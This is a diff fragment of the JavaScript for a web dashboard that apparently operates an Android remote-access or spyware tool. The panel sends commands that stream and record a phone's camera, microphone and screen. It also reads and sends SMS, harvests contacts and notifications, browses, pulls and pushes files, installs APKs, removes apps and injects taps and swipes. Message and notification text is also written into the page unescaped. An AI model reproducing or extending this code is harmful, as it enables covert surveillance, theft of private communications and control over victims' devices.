+  var pw = document.getElementById('downloadProg');
+  pw.style.display = 'block';
+  document.getElementById('downloadProgTxt').textContent =
+    'Downloading ' + d.filename + '  ' + d.progress + '%';
+  document.getElementById('downloadFill').style.width = d.progress + '%';
+});
+
+socket.on('file_ready', function(d) {
+  document.getElementById('downloadProg').style.display = 'none';
+  var a = document.createElement('a');
+  a.href = d.url; a.download = d.filename; a.click();
+  toast('Downloaded: ' + d.filename, 'ok');
+});
+
+socket.on('image_preview', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  document.getElementById('previewImg').src =
+    'data:image/jpeg;base64,' + d.imageData;
+  document.getElementById('previewModal').classList.add('open');
+});
+
+socket.on('file_deleted', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  toast(d.success ? 'File deleted' : 'Delete failed',
+        d.success ? 'ok' : 'er');
+  if (d.success) browseFiles(CUR_PATH);
+});
+
+socket.on('file_uploaded', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  document.getElementById('uploadProg').style.display = 'none';
+  toast('File uploaded to device', 'ok');
+  browseFiles(CUR_PATH);
+});
+
+socket.on('apps_data', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  ALL_APP = d.apps || [];
+  renderApps(ALL_APP);
+});
+
+socket.on('notification', function(d) {
+  if (d.deviceName === CUR_DEV) addNotification(d);
+});
+
+socket.on('recording_saved', function(d) {
+  if (d.deviceName === CUR_DEV)
+    toast('Recording saved · ' + (d.frameCount || 0) + ' frames', 'ok');
+});
+
+// ============================================================
+//  DEVICE MANAGEMENT
+// ============================================================
+function safeid(s) {
+  return (s || '').replace(/[^a-zA-Z0-9]/g, '_');
+}
+
+function addDevice(name, info) {
+  var list = document.getElementById('devList');
+  var eid  = 'DEV_' + safeid(name);
+
+  if (document.getElementById(eid)) {
+    updateSidebarMeta(Object.assign({ deviceName: name }, info || {}));
+    return;
+  }
+
+  // Remove placeholder
+  var ph = list.querySelector('.emptymsg');
+  if (ph) ph.remove();
+
+  var div = document.createElement('div');
+  div.className = 'devitem';
+  div.id = eid;
+  div.onclick = function() { selectDevice(name); };
+  div.innerHTML =
+    '<div class="devname">' + name + '</div>' +
+    '<div class="devst"><div class="dot"></div>Online</div>' +
+    '<div class="devmeta" id="DM_' + safeid(name) + '">' +
+      ((info && info.model) ? info.model : '') +
+      (info && info.androidVersion ? ' · Android ' + info.androidVersion : '') +
+    '</div>';
+  list.appendChild(div);
+}
+
+function removeDevice(name) {
+  var el = document.getElementById('DEV_' + safeid(name));
+  if (el) el.remove();
+
+  if (CUR_DEV === name) {
+    CUR_DEV = null;
+    document.getElementById('devCtrl').style.display = 'none';
+    document.getElementById('noselMsg').style.display = 'flex';
+  }
+
+  if (!document.querySelectorAll('.devitem').length) {
+    document.getElementById('devList').innerHTML =
+      '<div class="emptymsg">No devices online</div>';
+  }
+}
+
+function updateSidebarMeta(d) {
+  var m = document.getElementById('DM_' + safeid(d.deviceName));
+  if (m) m.textContent =
+    (d.model || '') + (d.battery !== undefined ? '  🔋' + d.battery + '%' : '');
+}
+
+function updateCount() {
+  document.getElementById('onlineCnt').textContent =
+    document.querySelectorAll('.devitem').length;
+}
+
+function selectDevice(name) {
+  CUR_DEV = name;
+
+  document.querySelectorAll('.devitem')
+    .forEach(function(e) { e.classList.remove('sel'); });
+  var el = document.getElementById('DEV_' + safeid(name));
+  if (el) el.classList.add('sel');
+
+  document.getElementById('noselMsg').style.display = 'none';
+  var dc = document.getElementById('devCtrl');
+  dc.style.display    = 'flex';
+  dc.style.flexDirection = 'column';
+  dc.style.flex       = '1';
+  dc.style.overflow   = 'hidden';
+
+  socket.emit('set_current_device', { deviceName: name });
+  cmd({ action: 'get_device_info' });
+
+  // Reset stream flags
+  STREAMING.cam = STREAMING.aud = STREAMING.scr = false;
+
+  // Setup screen touch
+  setupScreenTouch();
+
+  toast('Device: ' + name, 'in');
+}
+
+// ============================================================
+//  TABS
+// ============================================================
+function goTab(id) {
+  document.querySelectorAll('.tabBtn')
+    .forEach(function(e) { e.classList.remove('on'); });
+  document.querySelectorAll('.tabpanel')
+    .forEach(function(e) { e.classList.remove('on'); });
+  document.getElementById('TB-' + id).classList.add('on');
+  document.getElementById('TP-' + id).classList.add('on');
+}
+
+// ============================================================
+//  SEND COMMAND
+// ============================================================
+function cmd(command) {
+  if (!CUR_DEV) { toast('No device selected', 'er'); return; }
+  socket.emit('send_command', { deviceName: CUR_DEV, command: command });
+}
+
+// ============================================================
+//  DEVICE INFO
+// ============================================================
+function updateInfoPanel(i) {
+  setText('I-model',
+    (i.manufacturer || '') + ' ' + (i.model || ''));
+  setText('I-android',
+    'Android ' + (i.androidVersion || ''));
+  setText('I-battery', (i.battery || 0) + '%');
+  document.getElementById('I-charging').innerHTML = i.charging
+    ? '<span class="badge bok2">⚡ Yes</span>'
+    : '<span class="badge ber2">No</span>';
+  setText('I-network',
+    i.networkConnected ? '✅ ' + (i.networkType || '') : '❌ Offline');
+  setText('I-wifi',   i.wifiSSID   || 'N/A');
+  setText('I-sim',    i.simOperator || 'N/A');
+  setText('I-storage',
+    i.storageFree
+      ? fmtBytes(i.storageFree) + ' free / ' + fmtBytes(i.storageTotal)
+      : 'N/A');
+  setText('I-curapp', i.currentApp  || 'N/A');
+  document.getElementById('I-screen').innerHTML = i.screenOn
+    ? '<span class="badge bok2">ON</span>'
+    : '<span class="badge ber2">OFF</span>';
+  setText('I-phone',  i.phoneNumber || 'N/A');
+  setText('I-upd',    new Date(i.timestamp).toLocaleTimeString());
+}
+
+function setText(id, val) {
+  var el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+
+// ============================================================
+//  CAMERA
+// ============================================================
+function camStart() {
+  var type = document.getElementById('camType').value;
+  cmd({ action: 'start_camera_stream', camera: type });
+  socket.emit('watch_camera', { deviceName: CUR_DEV });
+  STREAMING.cam = true;
+  toast('Starting camera...', 'in');
+}
+
+function camStop() {
+  cmd({ action: 'stop_camera_stream' });
+  socket.emit('stop_watch_camera');
+  STREAMING.cam = false;
+  var img = document.getElementById('camImg');
+  img.classList.remove('show'); img.src = '';
+  document.getElementById('camPH').style.display = 'flex';
+}
+
+function camToggleRec() {
+  RECORDING.cam = !RECORDING.cam;
+  var btn = document.getElementById('btnCamRec');
+  if (RECORDING.cam) {
+    cmd({ action: 'record_camera',
+          camera: document.getElementById('camType').value });
+    btn.textContent = '⏹ Stop Rec';
+    btn.className   = 'btn ber bsm';
+    toast('Camera recording...', 'wn');
+  } else {
+    cmd({ action: 'stop_record_camera' });
+    btn.textContent = '⏺ Record';
+    btn.className   = 'btn bwn bsm';
+    toast('Recording stopped', 'ok');
+  }
+}
+
+// ============================================================
+//  AUDIO
+// ============================================================
+function audStart() {
+  cmd({ action: 'start_audio_stream' });
+  socket.emit('watch_audio', { deviceName: CUR_DEV });
+  STREAMING.aud = true;
+  document.getElementById('audStatus').textContent = '🔴 Streaming...';
+  initAudioCtx();
+  toast('Audio streaming...', 'in');
+}
+
+function audStop() {
+  cmd({ action: 'stop_audio_stream' });
+  socket.emit('stop_watch_audio');
+  STREAMING.aud = false;
+  document.getElementById('audStatus').textContent = 'Not streaming';
+}
+
+function audToggleRec() {
+  RECORDING.aud = !RECORDING.aud;
+  var btn = document.getElementById('btnAudRec');
+  if (RECORDING.aud) {
+    cmd({ action: 'record_audio' });
+    btn.textContent = '⏹ Stop Rec';
+    btn.className   = 'btn ber bsm';
+    toast('Audio recording...', 'wn');
+  } else {
+    cmd({ action: 'stop_record_audio' });
+    btn.textContent = '⏺ Record';
+    btn.className   = 'btn bwn bsm';
+    toast('Recording stopped', 'ok');
+  }
+}
+
+function initAudioCtx() {
+  if (!AUDIO_CTX) {
+    AUDIO_CTX = new (window.AudioContext || window.webkitAudioContext)();
+  }
+}
+
+function playAudioChunk(b64) {
+  if (!AUDIO_CTX) return;
+  try {
+    var raw = atob(b64);
+    var buf = new ArrayBuffer(raw.length);
+    var u8  = new Uint8Array(buf);
+    for (var i = 0; i < raw.length; i++) u8[i] = raw.charCodeAt(i);
+    var ab  = AUDIO_CTX.createBuffer(1, u8.length / 2, 44100);
+    var cd  = ab.getChannelData(0);
+    var dv  = new DataView(buf);
+    for (var j = 0; j < cd.length; j++)
+      cd[j] = dv.getInt16(j * 2, true) / 32768;
+    var src = AUDIO_CTX.createBufferSource();
+    src.buffer = ab;
+    src.connect(AUDIO_CTX.destination);
+    src.start();
+  } catch (e) {}
+}
+
+function animAudioViz() {
+  var viz = document.getElementById('aviz');
+  if (!viz.children.length) {
+    for (var i = 0; i < 22; i++) {
+      var b = document.createElement('div');
+      b.className = 'abar';
+      viz.appendChild(b);
+    }
+  }
+  Array.from(viz.children).forEach(function(b) {
+    b.style.height = (3 + Math.random() * 28) + 'px';
+  });
+}
+
+// ============================================================
+//  SCREEN
+// ============================================================
+function scrStart() {
+  cmd({ action: 'start_screen_stream' });
+  socket.emit('watch_screen', { deviceName: CUR_DEV });
+  STREAMING.scr = true;
+  toast('Starting screen...', 'in');
+}
+
+function scrStop() {
+  cmd({ action: 'stop_screen_stream' });
+  socket.emit('stop_watch_screen');
+  STREAMING.scr = false;
+  var img = document.getElementById('scrImg');
+  img.classList.remove('show'); img.src = '';
+  document.getElementById('scrPH').style.display = 'flex';
+}
+
+function scrToggleRec() {
+  RECORDING.scr = !RECORDING.scr;
+  var btn = document.getElementById('btnScrRec');
+  if (RECORDING.scr) {
+    cmd({ action: 'record_screen' });
+    btn.textContent = '⏹ Stop Rec';
+    btn.className   = 'btn ber bsm';
+    toast('Screen recording...', 'wn');
+  } else {
+    cmd({ action: 'stop_record_screen' });
+    btn.textContent = '⏺ Record';
+    btn.className   = 'btn bwn bsm';
+    toast('Recording stopped', 'ok');
+  }
+}
+
+// ============================================================
+//  SCREEN TOUCH CONTROL
+// ============================================================
+function setupScreenTouch() {
+  var img = document.getElementById('scrImg');
+
+  // Clone to remove old listeners
+  var fresh = img.cloneNode(true);
+  img.parentNode.replaceChild(fresh, img);
+
+  // Mouse
+  fresh.addEventListener('mousedown', function(e) {
+    if (!STREAMING.scr) return;
+    e.preventDefault();
+    mDown = true; mDrag = false;
+    var p = getPos(e, fresh);
+    mStartX = p.x; mStartY = p.y; mStartT = Date.now();
+  });
+
+  fresh.addEventListener('mousemove', function(e) {
+    if (!mDown || !STREAMING.scr) return;
+    var p = getPos(e, fresh);
+    if (Math.abs(p.x - mStartX) > 8 || Math.abs(p.y - mStartY) > 8)
+      mDrag = true;
+  });
+
+  fresh.addEventListener('mouseup', function(e) {
+    if (!mDown || !STREAMING.scr) { mDown = false; return; }
+    e.preventDefault();
+    var p   = getPos(e, fresh);
+    var dur = Date.now() - mStartT;
+    if (mDrag) {
+      cmd({
+        action: 'swipe',
+        x1: Math.round(mStartX), y1: Math.round(mStartY),
+        x2: Math.round(p.x),     y2: Math.round(p.y),
+        duration: Math.max(Math.min(dur, 1200), 150)
+      });
+    } else {
+      cmd({ action: 'tap',
+            x: Math.round(mStartX), y: Math.round(mStartY) });
+    }
+    mDown = false; mDrag = false;
+  });
+
+  fresh.addEventListener('mouseleave', function() { mDown = false; });
+
+  // Touch (for mobile browsers)
+  fresh.addEventListener('touchstart', function(e) {
+    if (!STREAMING.scr) return;
+    e.preventDefault();
+    var t = e.touches[0];
+    var p = getPosTouch(t, fresh);
+    mStartX = p.x; mStartY = p.y; mStartT = Date.now();
+    mDown = true; mDrag = false;
+  }, { passive: false });
+
+  fresh.addEventListener('touchmove', function(e) {
+    if (!mDown) return;
+    e.preventDefault();
+    var p = getPosTouch(e.touches[0], fresh);
+    if (Math.abs(p.x - mStartX) > 8 || Math.abs(p.y - mStartY) > 8)
+      mDrag = true;
+  }, { passive: false });
+
+  fresh.addEventListener('touchend', function(e) {
+    if (!mDown || !STREAMING.scr) { mDown = false; return; }
+    e.preventDefault();
+    var ex = mStartX, ey = mStartY;
+    if (e.changedTouches.length) {
+      var p = getPosTouch(e.changedTouches[0], fresh);
+      ex = p.x; ey = p.y;
+    }
+    var dur = Date.now() - mStartT;
+    if (mDrag) {
+      cmd({
+        action: 'swipe',
+        x1: Math.round(mStartX), y1: Math.round(mStartY),
+        x2: Math.round(ex),      y2: Math.round(ey),
+        duration: Math.max(Math.min(dur, 1200), 150)
+      });
+    } else {
+      cmd({ action: 'tap',
+            x: Math.round(mStartX), y: Math.round(mStartY) });
+    }
+    mDown = false; mDrag = false;
+  }, { passive: false });
+}
+
+function getPos(e, el) {
+  var r = el.getBoundingClientRect();
+  return {
+    x: ((e.clientX - r.left) / r.width)  * PHONE_W,
+    y: ((e.clientY - r.top)  / r.height) * PHONE_H
+  };
+}
+
+function getPosTouch(t, el) {
+  var r = el.getBoundingClientRect();
+  return {
+    x: ((t.clientX - r.left) / r.width)  * PHONE_W,
+    y: ((t.clientY - r.top)  / r.height) * PHONE_H
+  };
+}
+
+// ============================================================
+//  RECORDINGS LIST
+// ============================================================
+async function loadRecs(type) {
+  if (!CUR_DEV) return;
+  var map = { Camera: 'recCam', Audio: 'recAud', Screen: 'recScr' };
+  var el  = document.getElementById(map[type]);
+  if (!el) return;
+
+  var res   = await fetch('/recordings/' + AUTH_KEY + '/' + CUR_DEV + '/' + type);
+  var files = await res.json();
+
+  if (!files.length) {
+    el.innerHTML =
+      '<div style="color:var(--tx2);font-size:11px;padding:8px">' +
+      'No recordings yet</div>';
+    return;
+  }
+
+  var html = '<div class="tblwrap"><table>' +
+    '<thead><tr>' +
+    '<th>Filename</th><th>Size</th><th>Date</th><th>Actions</th>' +
+    '</tr></thead><tbody>';
+
+  files.forEach(function(f) {
+    html +=
+      '<tr>' +
+      '<td>' + f.filename + '</td>' +
+      '<td>' + fmtBytes(f.size) + '</td>' +
+      '<td>' + new Date(f.created).toLocaleString() + '</td>' +
+      '<td>' +
+        '<a href="' + f.url + '" download="' + f.filename + '">' +
+          '<button class="btn bok bsm">⬇</button>' +
+        '</a> ' +
+        '<button class="btn ber bsm" ' +
+          'onclick="delRec(\'' + type + '\',\'' + f.filename + '\')">' +
+          '🗑' +
+        '</button>' +
+      '</td>' +
+      '</tr>';
+  });
+
+  html += '</tbody></table></div>';
+  el.innerHTML = html;
+}
+
+async function delRec(type, fn) {
+  if (!confirm('Delete ' + fn + '?')) return;
+  await fetch(
+    '/recording/' + AUTH_KEY + '/' + CUR_DEV + '/' + type + '/' + fn,
+    { method: 'DELETE' }
+  );
+  loadRecs(type);
+  toast('Deleted', 'ok');
+}
+
+// ============================================================
+//  SMS
+// ============================================================
+function renderMessages(msgs) {
+  var el = document.getElementById('msgList');
+  el.innerHTML = '';
+  if (!msgs || !msgs.length) {
+    el.innerHTML =
+      '<div style="text-align:center;color:var(--tx2);padding:20px">' +
+      'No messages found</div>';
+    return;
+  }
+  msgs.sort(function(a, b) { return b.date - a.date; });
+  msgs.forEach(function(m) { el.appendChild(makeBubble(m)); });
+}
+
+function prependMessage(m) {
+  var el = document.getElementById('msgList');
+  var ph = el.querySelector('[style*=padding]');
+  if (ph) el.innerHTML = '';
+  el.insertBefore(makeBubble(m), el.firstChild);
+}
+
+function makeBubble(m) {
+  var d = document.createElement('div');
+  d.className = 'mbub ' + (m.type === 'inbox' ? 'min' : 'mout');
+  d.innerHTML =
+    '<div style="font-weight:700;font-size:10px">' + (m.address || '') + '</div>' +
+    '<div style="margin-top:3px">' + (m.body || '') + '</div>' +
+    '<div class="mmeta">' + new Date(m.date).toLocaleString() + '</div>';
+  return d;
+}
+
+function sendSMS() {
+  var num  = document.getElementById('smsNum').value.trim();
+  var body = document.getElementById('smsBody').value.trim();
+  if (!num || !body) { toast('Enter number and message', 'er'); return; }
+  cmd({ action: 'send_sms', number: num, message: body });
+  document.getElementById('smsBody').value = '';
+  toast('Sending SMS...', 'in');
+}
+
+// ============================================================
+//  CONTACTS
+// ============================================================
+function renderContacts(list) {
+  var el = document.getElementById('conList');
+  el.innerHTML = '';
+  if (!list || !list.length) {
+    el.innerHTML =
+      '<div style="color:var(--tx2);text-align:center;padding:20px">' +
+      'No contacts found</div>';
+    return;
+  }
+
+  var html = '<div class="tblwrap"><table>' +
+    '<thead><tr>' +
+    '<th>Name</th><th>Phone Numbers</th><th>Actions</th>' +
+    '</tr></thead><tbody>';
+
+  list.forEach(function(c) {
+    var ph = (c.phones || []).join(', ') || 'N/A';
+    var p0 = (c.phones && c.phones[0] ? c.phones[0] : '').replace(/[^0-9+]/g, '');
+    html +=
+      '<tr>' +
+      '<td>' + (c.name || 'Unknown') + '</td>' +
+      '<td style="font-size:11px">' + ph + '</td>' +
+      '<td>' +
+        '<button class="btn bok bsm" ' +
+          'onclick="cmd({action:\'open_url\',url:\'tel:' + p0 + '\'})">' +
+          '📞' +
+        '</button> ' +
+        '<button class="btn bin bsm" ' +
+          'onclick="goSMS(\'' + p0 + '\')">' +
+          '💬' +
+        '</button>' +
+      '</td>' +
+      '</tr>';
+  });
+
+  html += '</tbody></table></div>';
+  el.innerHTML = html;
+}
+
+function filterContacts() {
+  var q = document.getElementById('conSearch').value.toLowerCase();
+  renderContacts(ALL_CON.filter(function(c) {
+    return (c.name || '').toLowerCase().includes(q) ||
+           (c.phones || []).some(function(p) { return p.includes(q); });
+  }));
+}
+
+function goSMS(num) {
+  document.getElementById('smsNum').value = num;
+  goTab('sms');
+}
+
+// ============================================================
+//  FILES
+// ============================================================
+function browseFiles(path) {
+  CUR_PATH = path;
+  cmd({ action: 'browse_files', path: path });
+}
+
+function goUp() {
+  var parts = CUR_PATH.split('/').filter(function(p) { return p; });
+  parts.pop();
+  browseFiles('/' + parts.join('/') || '/');
+}
+
+function renderFiles(files, path) {
+  CUR_PATH = path;
+  makeBreadcrumb(path);
+
+  var el = document.getElementById('fileList');
+  el.innerHTML = '';
+
+  if (!files || !files.length) {
+    el.innerHTML =
+      '<div style="color:var(--tx2);text-align:center;padding:20px">' +
+      'Folder is empty</div>';
+    return;
+  }
+
+  var html = '<div class="tblwrap"><table>' +
+    '<thead><tr>' +
+    '<th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>' +
+    '</tr></thead><tbody>';
+
+  files.forEach(function(f) {
+    var fp  = (f.path  || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+    var fn  = (f.name  || '').replace(/'/g, "\\'");
+    var ico = f.isDirectory ? '📁' : f.isImage ? '🖼️' : f.isApk ? '📦' : '📄';
+    var acts = '';
+
+    if (f.isDirectory) {
+      acts = '<button class="btn bprim bsm" ' +
+             'onclick="browseFiles(\'' + fp + '\')">Open</button>';
+    } else {
+      if (f.isImage)
+        acts += '<button class="btn bin bsm" ' +
+                'onclick="previewFile(\'' + fp + '\')">👁 View</button> ';
+      acts += '<button class="btn bok bsm" ' +
+              'onclick="downloadFile(\'' + fp + '\',\'' + fn + '\')">⬇</button> ';
+      if (f.isApk)
+        acts += '<button class="btn bwn bsm" ' +
+                'onclick="cmd({action:\'install_apk\',path:\'' + fp + '\'})">Install</button> ';
+      acts += '<button class="btn ber bsm" ' +
+              'onclick="deleteFile(\'' + fp + '\')">🗑</button>';
+    }
+
+    html +=
+      '<tr>' +
+      '<td>' + ico + ' ' + (f.name || '') + '</td>' +
+      '<td>' + (f.isDirectory ? '—' : fmtBytes(f.size)) + '</td>' +
+      '<td>' + new Date(f.lastModified).toLocaleDateString() + '</td>' +
+      '<td>' + acts + '</td>' +
+      '</tr>';
+  });
+
+  html += '</tbody></table></div>';
+  el.innerHTML = html;
+}
+
+function makeBreadcrumb(path) {
+  var el = document.getElementById('breadcrumb');
+  el.innerHTML = '<span onclick="browseFiles(\'/\')">📱 Device</span>';
+  var parts = path.split('/').filter(function(p) { return p; });
+  var built = '';
+  parts.forEach(function(p) {
+    built += '/' + p;
+    var cp = built;
+    el.innerHTML +=
+      ' <span style="color:var(--tx2)">›</span> ' +
+      '<span onclick="browseFiles(\'' + cp + '\')">' + p + '</span>';
+  });
+}
+
+function previewFile(path) {
+  toast('Loading preview...', 'in');
+  cmd({ action: 'preview_image', path: path });
+}
+
+function closePreview() {
+  document.getElementById('previewModal').classList.remove('open');
+  document.getElementById('previewImg').src = '';
+}
+
+function downloadFile(path, name) {
+  cmd({ action: 'download_file', path: path });
+  document.getElementById('downloadProg').style.display = 'block';
+  toast('Downloading ' + name + '...', 'in');
+}
+
+function deleteFile(path) {
+  if (!confirm('Delete:\n' + path)) return;
+  cmd({ action: 'delete_file', path: path });
+}
+
+function doUpload() {
+  var input = document.getElementById('uploadInput');
+  var file  = input.files[0];
+  if (!file) return;
+  var targetPath = CUR_PATH.replace(/\/$/, '') + '/' + file.name;
+  document.getElementById('uploadProg').style.display = 'block';
+  document.getElementById('uploadFill').style.width = '0%';
+
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    var b64 = e.target.result.split(',')[1];
+    cmd({ action: 'upload_file', path: targetPath, data: b64 });
+    document.getElementById('uploadFill').style.width = '100%';
+  };
+  reader.readAsDataURL(file);
+  input.value = '';
+}
+
+// ============================================================
+//  APPS
+// ============================================================
+function renderApps(apps) {
+  var el = document.getElementById('appList');
+  el.innerHTML = '';
+  if (!apps || !apps.length) {
+    el.innerHTML =
+      '<div style="color:var(--tx2);text-align:center;padding:20px">' +
+      'No apps found</div>';
+    return;
+  }
+
+  var html = '<div class="tblwrap"><table>' +
+    '<thead><tr>' +
+    '<th>App Name</th><th>Package</th><th>Type</th><th>Actions</th>' +
+    '</tr></thead><tbody>';
+
+  apps.forEach(function(a) {
+    var pk = (a.package || '').replace(/'/g, "\\'");
+    var nm = (a.name    || '').replace(/'/g, "\\'");
+    html +=
+      '<tr>' +
+      '<td>📱 ' + (a.name || '') + '</td>' +
+      '<td style="font-size:10px;color:var(--tx2)">' + (a.package || '') + '</td>' +
+      '<td>' + (a.isSystem
+        ? '<span class="badge bin2">System</span>'
+        : '<span class="badge bok2">User</span>') + '</td>' +
+      '<td>' +
+        '<button class="btn bprim bsm" ' +
+          'onclick="cmd({action:\'open_app\',package:\'' + pk + '\'})">▶ Open</button> ' +
+        '<button class="btn ber bsm" ' +
+          'onclick="uninstallApp(\'' + pk + '\',\'' + nm + '\')">🗑</button>' +
+      '</td>' +
+      '</tr>';
+  });
+
+  html += '</tbody></table></div>';
+  el.innerHTML = html;
+}
+
+function filterApps() {
+  var q = document.getElementById('appSearch').value.toLowerCase();
+  renderApps(ALL_APP.filter(function(a) {
+    return (a.name || '').toLowerCase().includes(q) ||
+           (a.package || '').toLowerCase().includes(q);
+  }));
+}
+
+function uninstallApp(pkg, name) {
+  if (!confirm('Uninstall ' + name + '?')) return;
+  cmd({ action: 'uninstall_app', package: pkg });
+  toast('Uninstalling ' + name + '...', 'wn');
+}
+
+// ============================================================
+//  NOTIFICATIONS
+// ============================================================
+function addNotification(d) {
+  var el = document.getElementById('notifList');
+  var ph = el.querySelector('[style*=padding]');
+  if (ph) el.innerHTML = '';
+
+  var div = document.createElement('div');
+  div.className = 'nitem';
+  div.innerHTML =
+    '<div class="napp">📱 ' + (d.appName || '') + '</div>' +
+    '<div class="ntitle">' + (d.title || '') + '</div>' +
+    '<div class="ntext">'  + (d.text  || '') + '</div>' +
+    '<div class="ntime">'  + new Date(d.time).toLocaleTimeString() + '</div>';
+
+  el.insertBefore(div, el.firstChild);
+  while (el.children.length > 100) el.removeChild(el.lastChild);
+}
+
+function clearNotifs() {
+  document.getElementById('notifList').innerHTML =
+    '<div style="text-align:center;color:var(--tx2);padding:20px">' +
+    'Notifications cleared</div>';
+}
+
+// ============================================================
+//  REMOTE CONTROL
+// ============================================================
+function sendPopup() {
+  var m = document.getElementById('popupMsg').value.trim();
+  if (!m) return;
+  cmd({ action: 'show_popup', message: m });
+  document.getElementById('popupMsg').value = '';
+  toast('Popup sent to device', 'ok');
+}
+
+function openURL() {
+  var u = document.getElementById('urlInput').value.trim();
+  if (!u) return;
+  cmd({ action: 'open_url', url: u });
+  toast('Opening URL on device', 'in');
+}
+
+function makeCall() {
+  var n = document.getElementById('callNumber').value.trim();
+  if (!n) return;
+  cmd({ action: 'open_url', url: 'tel:' + n });
+  toast('Calling ' + n, 'in');
+}
+
+// ============================================================
+//  UTILITIES
+// ============================================================
+function fmtBytes(bytes) {
+  if (!bytes || bytes === 0) return '0 B';
+  var k  = 1024;
+  var sz = ['B', 'KB', 'MB', 'GB', 'TB'];
+  var i  = Math.floor(Math.log(bytes) / Math.log(k));
+  return (bytes / Math.pow(k, i)).toFixed(1) + ' ' + sz[i];
+}
+
+function toast(msg, type) {
+  type = type || 'in';
+  var wrap = document.getElementById('toastWrap');
+  var div  = document.createElement('div');
+  div.className = 'toast t' + type;
+  div.textContent = msg;
+  wrap.appendChild(div);
+  setTimeout(function() {
+    div.style.opacity    = '0';
+    div.style.transition = 'opacity .3s';
+    setTimeout(function() { div.remove(); }, 320);
+  }, 3000);
+}
+</script>
+</body>
+</html>
